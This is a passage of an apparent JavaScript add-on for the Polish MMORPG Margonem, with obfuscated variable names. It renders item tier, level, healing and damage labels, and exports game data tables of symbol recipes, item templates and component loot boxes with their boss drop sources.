  if ([28, 26].indexOf(_0x21e6da.cl) >= 0 && _0x459eb8.target_min_lvl) {
    const _0x3be20b = COMP_TIERS[_0x459eb8.target_min_lvl];
    console.log(_0x3be20b);
    if (_0x3be20b) {
      _0x37e64a.push("<div class=\"mp-basic-label mp-label-comp\">" + _0x3be20b + "</div>");
    }
  }
  if (_0x21e6da.cl === 16 && _0x459eb8.lootbox2 && _0x459eb8.opis) {
    const _0xac14de = _0x459eb8.opis;
    const _0x5018a2 = _0xac14de.includes("20-100") ? "T1" : _0xac14de.includes("101-200") ? "T2" : _0xac14de.includes("201-300") ? "T3" : null;
    if (_0x5018a2) {
      _0x37e64a.push("<div class=\"mp-basic-label mp-label-comp\">" + _0x5018a2 + "</div>");
    }
  }
  if (LEVEL_CLASSES.has(_0x21e6da.cl) && _0x459eb8.lvl) {
    _0x37e64a.push("<div class=\"mp-basic-label mp-label-level\">" + _0x459eb8.lvl + "</div>");
  }
  const _0x3944a3 = _0x459eb8.leczy ?? _0x459eb8.perheal ?? _0x459eb8.fullheal;
  if (_0x21e6da.cl === 16 && _0x3944a3 > 0) {
    _0x37e64a.push("<div class=\"mp-label-healing\"></div>");
  }
  const _0xb56c85 = DMG_KEYS.find(_0x4db396 => _0x459eb8[_0x4db396]);
  if (_0xb56c85) {
    _0x37e64a.push("<div class=\"mp-label-damage mp-damage-" + _0xb56c85 + "\"></div>");
  }
  if (!_0x37e64a.length) {
    return;
  }
  const _0x10850c = _0x37e64a.join("");
  if (_0x19b57c) {
    _0x111e1b.forEach(_0x22bba1 => {
      _0x22bba1.querySelectorAll(REMOVE_SELECTOR).forEach(_0x28d61b => _0x28d61b.remove());
      _0x22bba1.insertAdjacentHTML("beforeend", _0x10850c);
    });
  } else {
    _0x111e1b.querySelectorAll(REMOVE_SELECTOR).forEach(_0x20f305 => _0x20f305.remove());
    _0x111e1b.insertAdjacentHTML("beforeend", _0x10850c);
  }
}
export function getLocationsListImages() {
  return [2758, 3313, 7849, 5710, 610, 6950, 5662, 3597];
}
export function getSymbols() {
  return [{
    tier: 1,
    target: [8],
    legbon: "puncture",
    components: [54331, 54331, 54332],
    product: 54356
  }, {
    tier: 1,
    target: [8, 11, 13],
    legbon: "lastheal",
    components: [54331, 54332, 54334],
    product: 54351
  }, {
    tier: 1,
    target: [8, 10],
    legbon: "cleanse",
    components: [54331, 54333, 54334],
    product: 54353
  }, {
    tier: 1,
    target: [8, 10, 11],
    legbon: "curse",
    components: [54331, 54333, 54335],
    product: 54347
  }, {
    tier: 1,
    target: [8, 10],
    legbon: "critred",
    components: [54331, 54335, 54335],
    product: 54350
  }, {
    tier: 1,
    target: [8, 10, 13],
    legbon: "verycrit",
    components: [54332, 54332, 54333],
    product: 54346
  }, {
    tier: 1,
    target: [8, 11, 13],
    legbon: "facade",
    components: [54332, 54333, 54335],
    product: 54352
  }, {
    tier: 1,
    target: [8, 13],
    legbon: "holytouch",
    components: [54332, 54334, 54335],
    product: 54349
  }, {
    tier: 1,
    target: [8, 11],
    legbon: "glare",
    components: [54333, 54334, 54334],
    product: 54348
  }, {
    tier: 1,
    target: [8],
    legbon: "anguish",
    components: [54333, 54334, 54335],
    product: 54354
  }, {
    tier: 2,
    target: [8],
    legbon: "puncture",
    components: [54336, 54336, 54337],
    product: 57483
  }, {
    tier: 2,
    target: [8],
    legbon: "lastheal",
    components: [54336, 54337, 54339],
    product: 57478
  }, {
    tier: 2,
    target: [8, 9],
    legbon: "cleanse",
    components: [54336, 54338, 54339],
    product: 57480
  }, {
    tier: 2,
    target: [8, 9],
    legbon: "curse",
    components: [54336, 54338, 54340],
    product: 57474
  }, {
    tier: 2,
    target: [8, 9],
    legbon: "critred",
    components: [54336, 54340, 54340],
    product: 57477
  }, {
    tier: 2,
    target: [8],
    legbon: "verycrit",
    components: [54337, 54337, 54338],
    product: 57473
  }, {
    tier: 2,
    target: [8],
    legbon: "facade",
    components: [54337, 54338, 54340],
    product: 57479
  }, {
    tier: 2,
    target: [8],
    legbon: "holytouch",
    components: [54337, 54339, 54340],
    product: 57476
  }, {
    tier: 2,
    target: [8, 9],
    legbon: "glare",
    components: [54338, 54339, 54339],
    product: 57475
  }, {
    tier: 2,
    target: [8],
    legbon: "anguish",
    components: [54338, 54339, 54340],
    product: 57481
  }, {
    tier: 3,
    target: [8],
    legbon: "puncture",
    components: [54341, 54341, 54342],
    product: 57495
  }, {
    tier: 3,
    target: [8, 14, 29],
    legbon: "lastheal",
    components: [54341, 54342, 54344],
    product: 57490
  }, {
    tier: 3,
    target: [8, 14],
    legbon: "cleanse",
    components: [54341, 54343, 54344],
    product: 57492
  }, {
    tier: 3,
    target: [8, 5, 14],
    legbon: "curse",
    components: [54341, 54343, 54345],
    product: 57486
  }, {
    tier: 3,
    target: [8, 7],
    legbon: "critred",
    components: [54341, 54345, 54345],
    product: 57489
  }, {
    tier: 3,
    target: [8, 7, 29],
    legbon: "verycrit",
    components: [54342, 54342, 54343],
    product: 57485
  }, {
    tier: 3,
    target: [8, 5],
    legbon: "facade",
    components: [54342, 54343, 54345],
    product: 57491
  }, {
    tier: 3,
    target: [8, 5, 7],
    legbon: "holytouch",
    components: [54342, 54344, 54345],
    product: 57488
  }, {
    tier: 3,
    target: [8, 29],
    legbon: "glare",
    components: [54343, 54344, 54344],
    product: 57487
  }, {
    tier: 3,
    target: [8],
    legbon: "anguish",
    components: [54343, 54344, 54345],
    product: 57493
  }];
}
export function getTplsSymbolAndComponents() {
  return [{
    id: 57493,
    name: "Emanujący symbol krwawej udręki",
    type: "legendary",
    stat: "legbon=anguish,1;permbound;rarity=legendary;socket_enhancer;target_class=8;target_max_lvl=300;target_min_lvl=201",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_high_leg_ku.gif",
    tier: 3
  }, {
    id: 57487,
    name: "Emanujący symbol oślepienia",
    type: "legendary",
    stat: "legbon=glare,1;permbound;rarity=legendary;socket_enhancer;target_class=8,29;target_max_lvl=300;target_min_lvl=201",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_high_leg_bl.gif",
    tier: 3
  }, {
    id: 57488,
    name: "Emanujący symbol dotyku anioła",
    type: "legendary",
    stat: "legbon=holytouch,1;permbound;rarity=legendary;socket_enhancer;target_class=8,5,7;target_max_lvl=300;target_min_lvl=201",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_high_leg_da.gif",
    tier: 3
  }, {
    id: 57491,
    name: "Emanujący symbol fasady opieki",
    type: "legendary",
    stat: "legbon=facade,1;permbound;rarity=legendary;socket_enhancer;target_class=8,5;target_max_lvl=300;target_min_lvl=201",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_high_leg_fo.gif",
    tier: 3
  }, {
    id: 57485,
    name: "Emanujący symbol ciosu bardzo krytycznego",
    type: "legendary",
    stat: "legbon=verycrit,1;permbound;rarity=legendary;socket_enhancer;target_class=8,7,29;target_max_lvl=300;target_min_lvl=201",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_high_leg_cbk.gif",
    tier: 3
  }, {
    id: 57489,
    name: "Emanujący symbol krytycznej osłony",
    type: "legendary",
    stat: "legbon=critred,1;permbound;rarity=legendary;socket_enhancer;target_class=8,7;target_max_lvl=300;target_min_lvl=201",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_high_leg_ko.gif",
    tier: 3
  }, {
    id: 57486,
    name: "Emanujący symbol klątwy",
    type: "legendary",
    stat: "legbon=curse,1;permbound;rarity=legendary;socket_enhancer;target_class=8,5,14;target_max_lvl=300;target_min_lvl=201",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_high_leg_kl.gif",
    tier: 3
  }, {
    id: 57492,
    name: "Emanujący symbol płomiennego oczyszczenia",
    type: "legendary",
    stat: "legbon=cleanse,1;permbound;rarity=legendary;socket_enhancer;target_class=8,14;target_max_lvl=300;target_min_lvl=201",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_high_leg_po.gif",
    tier: 3
  }, {
    id: 57490,
    name: "Emanujący symbol ostatniego ratunku",
    type: "legendary",
    stat: "legbon=lastheal,1;permbound;rarity=legendary;socket_enhancer;target_class=8,14,29;target_max_lvl=300;target_min_lvl=201",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_high_leg_or.gif",
    tier: 3
  }, {
    id: 57495,
    name: "Emanujący symbol przeszywającej skuteczności",
    type: "legendary",
    stat: "legbon=puncture,1;permbound;rarity=legendary;socket_enhancer;target_class=8;target_max_lvl=300;target_min_lvl=201",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_high_leg_ps.gif",
    tier: 3
  }, {
    id: 57481,
    name: "Stabilny symbol krwawej udręki",
    type: "legendary",
    stat: "legbon=anguish,1;permbound;rarity=legendary;socket_enhancer;target_class=8;target_max_lvl=200;target_min_lvl=101",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_mid_leg_ku.gif",
    tier: 2
  }, {
    id: 57475,
    name: "Stabilny symbol oślepienia",
    type: "legendary",
    stat: "legbon=glare,1;permbound;rarity=legendary;socket_enhancer;target_class=8,9;target_max_lvl=200;target_min_lvl=101",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_mid_leg_bl.gif",
    tier: 2
  }, {
    id: 57476,
    name: "Stabilny symbol dotyku anioła",
    type: "legendary",
    stat: "legbon=holytouch,1;permbound;rarity=legendary;socket_enhancer;target_class=8;target_max_lvl=200;target_min_lvl=101",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_mid_leg_da.gif",
    tier: 2
  }, {
    id: 57479,
    name: "Stabilny symbol fasady opieki",
    type: "legendary",
    stat: "legbon=facade,1;permbound;rarity=legendary;socket_enhancer;target_class=8;target_max_lvl=200;target_min_lvl=101",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_mid_leg_fo.gif",
    tier: 2
  }, {
    id: 57473,
    name: "Stabilny symbol ciosu bardzo krytycznego",
    type: "legendary",
    stat: "legbon=verycrit,1;permbound;rarity=legendary;socket_enhancer;target_class=8;target_max_lvl=200;target_min_lvl=101",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_mid_leg_cbk.gif",
    tier: 2
  }, {
    id: 57477,
    name: "Stabilny symbol krytycznej osłony",
    type: "legendary",
    stat: "legbon=critred,1;permbound;rarity=legendary;socket_enhancer;target_class=8,9;target_max_lvl=200;target_min_lvl=101",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_mid_leg_ko.gif",
    tier: 2
  }, {
    id: 57474,
    name: "Stabilny symbol klątwy",
    type: "legendary",
    stat: "legbon=curse,1;permbound;rarity=legendary;socket_enhancer;target_class=8,9;target_max_lvl=200;target_min_lvl=101",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_mid_leg_kl.gif",
    tier: 2
  }, {
    id: 57480,
    name: "Stabilny symbol płomiennego oczyszczenia",
    type: "legendary",
    stat: "legbon=cleanse,1;permbound;rarity=legendary;socket_enhancer;target_class=8,9;target_max_lvl=200;target_min_lvl=101",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_mid_leg_po.gif",
    tier: 2
  }, {
    id: 57478,
    name: "Stabilny symbol ostatniego ratunku",
    type: "legendary",
    stat: "legbon=lastheal,1;permbound;rarity=legendary;socket_enhancer;target_class=8;target_max_lvl=200;target_min_lvl=101",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_mid_leg_or.gif",
    tier: 2
  }, {
    id: 57483,
    name: "Stabilny symbol przeszywającej skuteczności",
    type: "legendary",
    stat: "legbon=puncture,1;permbound;rarity=legendary;socket_enhancer;target_class=8;target_max_lvl=200;target_min_lvl=101",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_mid_leg_ps.gif",
    tier: 2
  }, {
    id: 54354,
    name: "Słaby symbol krwawej udręki",
    type: "legendary",
    stat: "legbon=anguish,1;permbound;rarity=legendary;socket_enhancer;target_class=8;target_max_lvl=100;target_min_lvl=20",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_low_leg_ku.gif",
    tier: 2
  }, {
    id: 54348,
    name: "Słaby symbol oślepienia",
    type: "legendary",
    stat: "legbon=glare,1;permbound;rarity=legendary;socket_enhancer;target_class=8,11;target_max_lvl=100;target_min_lvl=20",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_low_leg_bl.gif",
    tier: 1
  }, {
    id: 54349,
    name: "Słaby symbol dotyku anioła",
    type: "legendary",
    stat: "legbon=holytouch,1;permbound;rarity=legendary;socket_enhancer;target_class=8,13;target_max_lvl=100;target_min_lvl=20",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_low_leg_da.gif",
    tier: 1
  }, {
    id: 54352,
    name: "Słaby symbol fasady opieki",
    type: "legendary",
    stat: "legbon=facade,1;permbound;rarity=legendary;socket_enhancer;target_class=8,11,13;target_max_lvl=100;target_min_lvl=20",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_low_leg_fo.gif",
    tier: 1
  }, {
    id: 54346,
    name: "Słaby symbol ciosu bardzo krytycznego",
    type: "legendary",
    stat: "legbon=verycrit,1;permbound;rarity=legendary;socket_enhancer;target_class=8,10,13;target_max_lvl=100;target_min_lvl=20",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_low_leg_cbk.gif",
    tier: 1
  }, {
    id: 54350,
    name: "Słaby symbol krytycznej osłony",
    type: "legendary",
    stat: "legbon=critred,1;permbound;rarity=legendary;socket_enhancer;target_class=8,10;target_max_lvl=100;target_min_lvl=20",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_low_leg_ko.gif",
    tier: 1
  }, {
    id: 54347,
    name: "Słaby symbol klątwy",
    type: "legendary",
    stat: "legbon=curse,1;permbound;rarity=legendary;socket_enhancer;target_class=8,10,11;target_max_lvl=100;target_min_lvl=20",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_low_leg_kl.gif",
    tier: 1
  }, {
    id: 54353,
    name: "Słaby symbol płomiennego oczyszczenia",
    type: "legendary",
    stat: "legbon=cleanse,1;permbound;rarity=legendary;socket_enhancer;target_class=8,10;target_max_lvl=100;target_min_lvl=20",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_low_leg_po.gif",
    tier: 1
  }, {
    id: 54351,
    name: "Słaby symbol ostatniego ratunku",
    type: "legendary",
    stat: "legbon=lastheal,1;permbound;rarity=legendary;socket_enhancer;target_class=8,11,13;target_max_lvl=100;target_min_lvl=20",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_low_leg_or.gif",
    tier: 1
  }, {
    id: 54356,
    name: "Słaby symbol przeszywającej skuteczności",
    type: "legendary",
    stat: "legbon=puncture,1;permbound;rarity=legendary;socket_enhancer;target_class=8;target_max_lvl=100;target_min_lvl=20",
    pr: 21,
    prc: "zl",
    cl: 26,
    icon: "upg/symbol_low_leg_ps.gif",
    tier: 1
  }, {
    id: 54331,
    name: "Słaby stalowy komponent",
    type: "legendary",
    stat: "permbound;rarity=legendary;socket_component;target_max_lvl=100;target_min_lvl=20",
    pr: 21,
    prc: "zl",
    cl: 28,
    icon: "sur/component_low_steel.gif",
    tier: 1
  }, {
    id: 54332,
    name: "Słaby ognisty komponent",
    type: "legendary",
    stat: "permbound;rarity=legendary;socket_component;target_max_lvl=100;target_min_lvl=20",
    pr: 21,
    prc: "zl",
    cl: 28,
    icon: "sur/component_low_fire.gif",
    tier: 1
  }, {
    id: 54333,
    name: "Słaby lodowy komponent",
    type: "legendary",
    stat: "permbound;rarity=legendary;socket_component;target_max_lvl=100;target_min_lvl=20",
    pr: 21,
    prc: "zl",
    cl: 28,
    icon: "sur/component_low_frost.gif",
    tier: 1
  }, {
    id: 54334,
    name: "Słaby elektryczny komponent",
    type: "legendary",
    stat: "permbound;rarity=legendary;socket_component;target_max_lvl=100;target_min_lvl=20",
    pr: 21,
    prc: "zl",
    cl: 28,
    icon: "sur/component_low_light.gif",
    tier: 1
  }, {
    id: 54335,
    name: "Słaby jadowy komponent",
    type: "legendary",
    stat: "permbound;rarity=legendary;socket_component;target_max_lvl=100;target_min_lvl=20",
    pr: 21,
    prc: "zl",
    cl: 28,
    icon: "sur/component_low_venom.gif",
    tier: 1
  }, {
    id: 54336,
    name: "Stabilny stalowy komponent",
    type: "legendary",
    stat: "permbound;rarity=legendary;socket_component;target_max_lvl=200;target_min_lvl=101",
    pr: 21,
    prc: "zl",
    cl: 28,
    icon: "sur/component_mid_steel.gif",
    tier: 2
  }, {
    id: 54337,
    name: "Stabilny ognisty komponent",
    type: "legendary",
    stat: "permbound;rarity=legendary;socket_component;target_max_lvl=200;target_min_lvl=101",
    pr: 21,
    prc: "zl",
    cl: 28,
    icon: "sur/component_mid_fire.gif",
    tier: 2
  }, {
    id: 54338,
    name: "Stabilny lodowy komponent",
    type: "legendary",
    stat: "permbound;rarity=legendary;socket_component;target_max_lvl=200;target_min_lvl=101",
    pr: 21,
    prc: "zl",
    cl: 28,
    icon: "sur/component_mid_frost.gif",
    tier: 2
  }, {
    id: 54339,
    name: "Stabilny elektryczny komponent",
    type: "legendary",
    stat: "permbound;rarity=legendary;socket_component;target_max_lvl=200;target_min_lvl=101",
    pr: 21,
    prc: "zl",
    cl: 28,
    icon: "sur/component_mid_light.gif",
    tier: 2
  }, {
    id: 54340,
    name: "Stabilny jadowy komponent",
    type: "legendary",
    stat: "permbound;rarity=legendary;socket_component;target_max_lvl=200;target_min_lvl=101",
    pr: 21,
    prc: "zl",
    cl: 28,
    icon: "sur/component_mid_venom.gif",
    tier: 2
  }, {
    id: 54341,
    name: "Emanujący stalowy komponent",
    type: "legendary",
    stat: "permbound;rarity=legendary;socket_component;target_max_lvl=300;target_min_lvl=201",
    pr: 21,
    prc: "zl",
    cl: 28,
    icon: "sur/component_high_steel.gif",
    tier: 3
  }, {
    id: 54342,
    name: "Emanujący ognisty komponent",
    type: "legendary",
    stat: "permbound;rarity=legendary;socket_component;target_max_lvl=300;target_min_lvl=201",
    pr: 21,
    prc: "zl",
    cl: 28,
    icon: "sur/component_high_fire.gif",
    tier: 3
  }, {
    id: 54343,
    name: "Emanujący lodowy komponent",
    type: "legendary",
    stat: "permbound;rarity=legendary;socket_component;target_max_lvl=300;target_min_lvl=201",
    pr: 21,
    prc: "zl",
    cl: 28,
    icon: "sur/component_high_frost.gif",
    tier: 3
  }, {
    id: 54344,
    name: "Emanujący elektryczny komponent",
    type: "legendary",
    stat: "permbound;rarity=legendary;socket_component;target_max_lvl=300;target_min_lvl=201",
    pr: 21,
    prc: "zl",
    cl: 28,
    icon: "sur/component_high_light.gif",
    tier: 3
  }, {
    id: 54345,
    name: "Emanujący jadowy komponent",
    type: "legendary",
    stat: "permbound;rarity=legendary;socket_component;target_max_lvl=300;target_min_lvl=201",
    pr: 21,
    prc: "zl",
    cl: 28,
    icon: "sur/component_high_venom.gif",
    tier: 3
  }];
}
export function getStashComponents() {
  return [{
    tier: 1,
    id: 59447,
    name: "Lekka skrytka mocy",
    type: "legendary",
    stat: "amount=1;canpreview;cansplit=1;capacity=100;lootbox2=2932;opis=Zawiera losowy komponent, niezbędny do utworzenia symbolu ulepszającego ekwipunek na poziomie 20-100.[br][br]Po otworzeniu skrzynki, łup staje się związany na stałe.;rarity=legendary",
    pr: 21,
    prc: "zl",
    cl: 16,
    icon: "bag/kuf_compontent_06.gif.gif",
    drop: [{
      nick: "Mroczny Patryk",
      lvl: 35,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/bardzozlypatryk.gif"
    }, {
      nick: "Karmazynowy Mściciel",
      lvl: 45,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/gnom_msciciel.gif"
    }, {
      nick: "Złodziej",
      lvl: 51,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/zlodziej.gif"
    }, {
      nick: "Zły Przewodnik",
      lvl: 63,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/mnich-zly2.gif"
    }, {
      nick: "Opętany Paladyn",
      lvl: 74,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/opetanypaladyn02.gif"
    }, {
      nick: "Piekielny Kościej",
      lvl: 85,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/piekielny_kosciej.gif"
    }, {
      nick: "Koziec Mąciciel Ścieżek",
      lvl: 94,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/koziec_maciciel_sciezek.gif"
    }]
  }, {
    tier: 1,
    id: 59448,
    name: "Lekka skrytka stalowej mocy",
    type: "legendary",
    stat: "amount=1;canpreview;cansplit=1;capacity=100;lootbox2=2933;opis=Zawiera losowy komponent, niezbędny do utworzenia symbolu ulepszającego ekwipunek na poziomie 20-100. Szansa na Stalowy komponent jest dwukrotnie większa od pozostałych.[br][br]Po otworzeniu skrzynki, łup staje się związany na stałe.;rarity=legendary",
    pr: 21,
    prc: "zl",
    cl: 16,
    icon: "bag/kuf_compontent_04.gif.gif",
    drop: [{
      nick: "Kotołak Tropiciel",
      lvl: 27,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e1/kotolak_lowca.gif"
    }, {
      nick: "Szczęt alias Gładki",
      lvl: 47,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/zbir-szczet.gif"
    }, {
      nick: "Foverk Turrim",
      lvl: 57,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/kobold07.gif"
    }, {
      nick: "Podły zbrojmistrz",
      lvl: 82,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/magaz_zbrojmistrz.gif"
    }, {
      nick: "Morthen",
      lvl: 89,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/krasnolud_boss.gif"
    }, {
      nick: "Leśne Widmo",
      lvl: 92,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/lesne_widmo.gif"
    }]
  }, {
    tier: 1,
    id: 59449,
    name: "Lekka skrytka ognistej mocy",
    type: "legendary",
    stat: "amount=1;canpreview;cansplit=1;capacity=100;lootbox2=2934;opis=Zawiera losowy komponent, niezbędny do utworzenia symbolu ulepszającego ekwipunek na poziomie 20-100. Szansa na Ognisty komponent jest dwukrotnie większa od pozostałych.[br][br]Po otworzeniu skrzynki, łup staje się związany na stałe.;rarity=legendary",
    pr: 21,
    prc: "zl",
    cl: 16,
    icon: "bag/kuf_compontent_02.gif.gif",
    drop: [{
      nick: "Shae Phu",
      lvl: 30,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/demonszef.gif"
    }, {
      nick: "Razuglag Oklash",
      lvl: 51,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/razuglag.gif"
    }, {
      nick: "Furruk Kozug",
      lvl: 66,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/gnoll12.gif"
    }, {
      nick: "Grabarz świątynny",
      lvl: 80,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/nieu_mnich_grabarz.gif"
    }, {
      nick: "Nadzorczyni krasnoludów",
      lvl: 88,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/nadzorczyni_krasnoludow.gif"
    }]
  }, {
    tier: 1,
    id: 59450,
    name: "Lekka skrytka lodowej mocy",
    type: "legendary",
    stat: "amount=1;canpreview;cansplit=1;capacity=100;lootbox2=2935;opis=Zawiera losowy komponent, niezbędny do utworzenia symbolu ulepszającego ekwipunek na poziomie 20-100. Szansa na Lodowy komponent jest dwukrotnie większa od pozostałych.[br][br]Po otworzeniu skrzynki, łup staje się związany na stałe.;rarity=legendary",
    pr: 21,
    prc: "zl",
    cl: 16,
    icon: "bag/kuf_compontent_01.gif",
    drop: [{
      nick: "Mushita",
      lvl: 23,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/st-puma.gif"
    }, {
      nick: "Władca rzek",
      lvl: 37,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/gobmag2.gif"
    }, {
      nick: "Agar",
      lvl: 51,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/glut_agar.gif"
    }, {
      nick: "Jotun",
      lvl: 70,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/kam_olbrzym-b.gif"
    }, {
      nick: "Wielka Stopa",
      lvl: 82,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/wlochacze_wielka_stopa.gif"
    }, {
      nick: "Goplana",
      lvl: 93,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/goplana.gif"
    }]
  }, {
    tier: 1,
    id: 59451,
    name: "Lekka skrytka elektrycznej mocy",
    type: "legendary",
    stat: "amount=1;canpreview;cansplit=1;capacity=100;lootbox2=2936;opis=Zawiera losowy komponent, niezbędny do utworzenia symbolu ulepszającego ekwipunek na poziomie 20-100. Szansa na Elektryczny komponent jest dwukrotnie większa od pozostałych.[br][br]Po otworzeniu skrzynki, łup staje się związany na stałe.;rarity=legendary",
    pr: 21,
    prc: "zl",
    cl: 16,
    icon: "bag/kuf_compontent_03.gif.gif",
    drop: [{
      nick: "Tyrtajos",
      lvl: 42,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/dzik.gif"
    }, {
      nick: "Tollok Shimger",
      lvl: 47,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/tollok_shimger.gif"
    }, {
      nick: "Vari Kruger",
      lvl: 66,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/gnoll11.gif"
    }, {
      nick: "Lisz",
      lvl: 75,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/lisz_demilisze.gif"
    }, {
      nick: "Choukker",
      lvl: 84,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/dlawiciel5.gif"
    }, {
      nick: "Gnom Figlid",
      lvl: 96,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/gnom_figlid.gif"
    }]
  }, {
    tier: 1,
    id: 59452,
    name: "Lekka skrytka jadowej mocy",
    type: "legendary",
    stat: "amount=1;canpreview;cansplit=1;capacity=100;lootbox2=2937;opis=Zawiera losowy komponent, niezbędny do utworzenia symbolu ulepszającego ekwipunek na poziomie 20-100. Szansa na Jadowy komponent jest dwukrotnie większa od pozostałych.[br][br]Po otworzeniu skrzynki, łup staje się związany na stałe.;rarity=legendary",
    pr: 21,
    prc: "zl",
    cl: 16,
    icon: "bag/kuf_compontent_05.gif.gif",
    drop: [{
      nick: "Zorg Jednooki Baron",
      lvl: 33,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/zbir-e2-zorg.gif"
    }, {
      nick: "Gobbos",
      lvl: 40,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/gobsamurai.gif"
    }, {
      nick: "Owadzia Matka",
      lvl: 58,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/zadlak-e2-owadzia-matka.gif"
    }, {
      nick: "Tollok Atamatu",
      lvl: 73,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/tollok_jask_atamatu.gif"
    }, {
      nick: "Tollok Utumutu",
      lvl: 73,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/tollok_jask_utumatu.gif"
    }, {
      nick: "Żelazoręki Ohydziarz",
      lvl: 92,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/ugrape2.gif"
    }, {
      nick: "Centaur Zyfryd",
      lvl: 99,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/e2/cent-zyfryd.gif"
    }]
  }, {
    tier: 2,
    id: 59455,
    name: "Solidna skrytka mocy",
    type: "legendary",
    stat: "amount=1;canpreview;cansplit=1;capacity=100;lootbox2=2938;opis=Zawiera losowy komponent, niezbędny do utworzenia symbolu ulepszającego ekwipunek na poziomie 101-200.[br][br]Po otworzeniu skrzynki, łup staje się związany na stałe.;rarity=legendary",
    pr: 21,
    prc: "zl",
    cl: 16,
    icon: "bag/kuf_compontent_14.gif",
    drop: [{
      nick: "Kochanka Nocy",
      lvl: 102,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/kochanka-nocy.gif"
    }, {
      nick: "Książe Kasim",
      lvl: 116,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/ksiaze-kasim.gif"
    }, {
      nick: "Święty Braciszek",
      lvl: 123,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/sw_braciszek.gif"
    }, {
      nick: "Złoty Roger",
      lvl: 135,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/szkielet_pirata.gif"
    }, {
      nick: "Baca bez Łowiec",
      lvl: 144,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/baca-bez-lowiec.gif"
    }, {
      nick: "Czarująca Atalia",
      lvl: 157,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/czarujaca-atalia.gif"
    }, {
      nick: "Obłąkany Łowca Orków",
      lvl: 165,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/oblakany_ac1dae9d.gif"
    }, {
      nick: "Lichwiarz Grauhaz",
      lvl: 177,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/lichwiarz_grauhaz.gif"
    }, {
      nick: "Viviana Nandin",
      lvl: 185,
      icon: "https://micc.garmory-cdn.cloud/obrazki/npc/her/viv_nandin_i3bd1.gif"
    }, {
      nick: "Przeraza",
      lvl: 194,
